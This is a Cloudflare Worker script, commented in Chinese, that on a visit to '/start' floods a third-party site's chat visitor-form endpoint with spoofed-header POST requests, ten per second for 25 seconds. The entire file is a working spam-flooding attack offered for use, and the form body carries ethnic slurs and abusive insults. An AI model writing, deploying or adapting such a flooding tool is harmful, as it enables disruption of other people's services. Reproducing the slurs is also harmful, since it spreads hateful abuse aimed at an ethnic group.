export default {
  async fetch(request, env, ctx) {
    // 檢查是否為觸發請求，你可以訪問你的 worker 網址來啟動它
    const url = new URL(request.url);
    
    if (url.pathname === '/start') {
      // 使用 ctx.waitUntil 讓背景繼續執行發送任務，不阻塞 HTTP 回應
      ctx.waitUntil(startSpamming());
      return new Response('Spam task started: 10 requests/second', { status: 200 });
    }

    return new Response('Cloudflare Worker is running. Access /start to trigger requests.', { status: 200 });
  }
};

async function startSpamming() {
  const targetUrl = 'https://biz.6pvgq.shop/api/chat/visitor/submitUserForm';
  
  const headers = {
    'Host': 'biz.6pvgq.shop',
    'Connection': 'keep-alive',
    'sec-ch-ua-platform': '"Android"',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 16; 2510DPC44G Build/BP2A.250605.031.A3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.8059.43 Mobile Safari/537.36',
    'Accept': 'application/json',
    'sec-ch-ua': '"Android WebView";v="155", "Chromium";v="155", "Not(A:Brand";v="24"',
    'Content-Type': 'application/json;charset=UTF-8',
    'sec-ch-ua-mobile': '?1',
    'Origin': 'https://biz.6pvgq.shop',
    'X-Requested-With': 'mark.via.gp',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
    'Referer': 'https://biz.6pvgq.shop/chat/index?channelId=b1edf990c8804f23a22d36195acd1d4b&isBack=true',
    'Accept-Encoding': 'gzip, deflate, br, zstd',
    'Accept-Language': 'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7'
  };

  const body = JSON.stringify({
    "userId": "3c388bcebe974aa99262e0605b6275ce",
    "userName": "8964",
    "phone": "操你妈逼支那贱种活该被电",
    "email": "cnmb@cnmb.com",
    "formParams": "[{\"name\":\"微信\",\"key\":\"weixin\",\"show\":false,\"require\":false,\"value\":\"\"},{\"name\":\"备注\",\"key\":\"remark\",\"show\":false,\"require\":false,\"value\":\"\"}]"
  });

  // 由於 Worker 運行時間限制，我們可以連續發送一段時間（例如 25 秒，避免超時）
  // 每 100 毫秒發送一次 = 每秒 10 次
  const totalDurationMs = 25000; // 25 秒
  const intervalMs = 100;       // 100 毫秒
  const iterations = totalDurationMs / intervalMs;

  let current = 0;

  return new Promise((resolve) => {
    const timer = setInterval(async () => {
      current++;
      if (current > iterations) {
        clearInterval(timer);
        resolve();
        return;
      }

      try {
        // 非同步發送請求，不阻塞下一次間隔
        fetch(targetUrl, {
          method: 'POST',
          headers: headers,
          body: body
        }).catch(err => {
          // 忽略網路雜訊錯誤
        });
      } catch (e) {
        // 忽略例外
      }
    }, intervalMs);
  });
}
